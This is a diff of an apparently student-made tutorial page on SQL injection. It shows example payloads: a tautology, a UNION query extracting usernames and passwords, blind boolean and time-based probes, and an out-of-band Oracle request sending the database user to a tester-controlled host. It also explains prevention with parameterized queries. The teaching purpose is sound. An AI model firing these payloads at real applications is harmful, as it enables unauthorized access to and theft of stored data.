@@ -8,7 +8,7 @@
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 		
-		<!-- custom js and css below --!>
+		<!-- custom js and css below -->
 
 	 	<link rel="stylesheet" href="index.css">
 		<script src="index.js"></script>
@@ -20,7 +20,7 @@
 				<h4>Jonathan Quang and Daniel Chernovolenko</h4></center>
 		</div>
 
-		<div id="MainBodyStuff"><center>
+		<div id="MainBodyStuff">
 			<h2>What is a SQL Injection (SQLi)?</h2>
 			<p>SQL injection refers to an attack where an attacker can execute malicious SQL statements (known as payloads).
 			This is typically done by exploiting poorly designed construction of SQL statements in backend code.
@@ -37,12 +37,13 @@
 			</p>
 			<br>
 			<pre>
-				<code>	Import sqlite3
-					conn=sqlite3.connect('example.db')
-					c=conn.cursor()
-					c.execute("CREATE TABLE students (name text, grade real)")
-					conn.commit()
-					conn.close()</code>
+				<code>	
+Import sqlite3
+conn=sqlite3.connect('example.db')
+c=conn.cursor()
+c.execute("CREATE TABLE students (name text, grade real)")
+conn.commit()
+conn.close()</code>
 			</pre>
 			<br>
 			<h2>How Does an Enduser Give Input and Recieve Output</h2>
@@ -50,10 +51,11 @@
 			</p>
 			<br>
 			<pre>
-				<code>sqlStatement = "SELECT * FROM students WHERE name = " + userName
-				result = c.execute(sqlStatement)
-				for row in result:
-      					print row</code>
+				<code>
+sqlStatement = "SELECT * FROM students WHERE name = " + userName
+result = c.execute(sqlStatement)
+for row in result:
+			print row</code>
 			</pre>
 
 
@@ -63,10 +65,11 @@
 			</p>
 			<br>
 			<pre>
-				<code>sqlStatement = "SELECT * FROM students WHERE name = 105 OR 1=1"
-				result = c.execute(sqlStatement)
-				for row in result:
-      				print row</code>
+				<code>
+sqlStatement = "SELECT * FROM students WHERE name = 105 OR 1=1"
+result = c.execute(sqlStatement)
+for row in result:
+		print row</code>
 			</pre>
 			<br>
 			<p>name=105 or 1=1 is a logical statement that is always true. This results in the entire table of students being printed out.
@@ -81,16 +84,81 @@
 			</p>
 			<br>
 			<h2>There are Three Types Of SQL Injections </h2>
-			<br>
-			<ul>
-				<li>In-Band SQLi</li>
-				<li>Inferential SQL Injection (Blind SQLi)</li>
-				<li>Out-of-band SQLi</li>
-			</ul>
+				<h3>In-Band SQLi</h3>
+				<p>
+						When the attacker uses the same communication channel to both attack and receive results. Easiest and most common method. </p>
+						<h4>Error-based SQLi:</h4>
+						<p>
+						Relies on error messages thrown to get info about the structure of the DB.
+						Specifically relies on on a few bugs such as the GROUP BY statement in SQL.</p>
+						<pre>
+								<code>
+http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--</code>
+									</pre>
+								<p>In this example, the tester is concatenating the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME. This Oracle function will try to return the host name of the parameter passed to it, which is other query, the name of the user. When the database looks for a host name with the user database name, it will fail and return an error message like:</p>
+						<h4>Union-based SQLi:</h4>
+						<p>
+						Uses the UNION SQL operator to combine the results of multiple select statements that are returned as part of the http response</p>
+						<pre>
+						<code>
+www.estore.com/items/items.asp?itemid=1 UNION SELECT username, password FROM users</code>
+							</pre>
+				</p>
+				
+				<h3>Inferential SQL Injection (Blind SQLi)</h3>
+				<p>
+						When the attacker sends payloads and observes the web application’s response without actually transferring any data (no results will be physically shown.) More difficult but still just as dangerous. </p>
+						<h4>Boolean-based (content-based) Blind SQLi:</h4>
+						<p>
+						Sends an SQL query that forces the application to return a different result depending on whether it returns a True or False</p>
+						<pre>
+						<code>
+SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'</code>
+						</pre>
+						<p>The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function.</p>
+						<h4>Time-based Blind SQLi:</h4>
+						<p>
+						Sends an SQL query that forces the database to wait for a certain about of time before responding. This time will let the attacker figure out if the result is True or False.</p>
+						<pre>
+						<code>
+http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--</code>
+							</pre>
+						<p>In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.</p>
+				</p>
+				<h3>Out-of-band SQLi</h3>
+				<p>
+						Relies on debugging features being enabled on the db server being used by the web app. Not very common, other methods preferred.
+						Can offer an alternative to Time-based Blind SQLi if the server is unstable.
+						Uses these debugging methods to send DNS or HTTP requests to a SQL server the attacker controls.
+						</p>
+						<pre>
+								<code>
+http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--</code>
+									</pre>
+								<p>In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request. This Oracle function will try to connect to ‘testerserver’ and make a HTTP GET request containing the return from the query “SELECT user FROM DUAL”. The tester can set up a webserver (e.g. Apache) to get the result.</p>
+				<h2>Preventing SQL Injection</h2>
+				<p class="noindent">We want python and the SQL database to treat the end-user’s input literally.<br>
+						Accomplished using “?” in python with sqlite3<br></p>
+						<pre>
+								<code>
+c.execute('SELECT * FROM stocks WHERE symbol=?', input)</code>
+									</pre>
+						<p class="noindent">
+						Instead of executing a string, a tuple is executed.<br>
+						Other programming languages and SQL DB systems have other ways of executing a literal.
+						</p>
+					<h2> Sources for learning more: </h2>
+					<h4> Our demo:</h4>
+						<p><a href="https://github.com/dchernovolenko/presentation2">Github Repo for demo</a></p>
+					<p><a href="http://bobby-tables.com"> http://bobby-tables.com </a> - list on how to prevent SQL injection on a multitude of platforms.<br>
+							<a href="http://sqlzoo.net/hack/">http://sqlzoo.net/hack/</a> - basic hackit<br>
+							<a href="https://redtiger.labs.overthewire.org/">https://redtiger.labs.overthewire.org</a> - harder hackit<br>
+							<a href="https://www.acunetix.com/websitesecurity/sql-injection/">https://www.acunetix.com/websitesecurity/sql-injection/</a> - acunteix’s resources on SQLi<br>
+							<a href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a> - OWASP resources on SQLi<br>
+							Google/Reddit in general have tons of more resources and practice sites.
+							</p>
 
-
-
-			</center></div>
+			</div>
 
 	</body>
 </html>
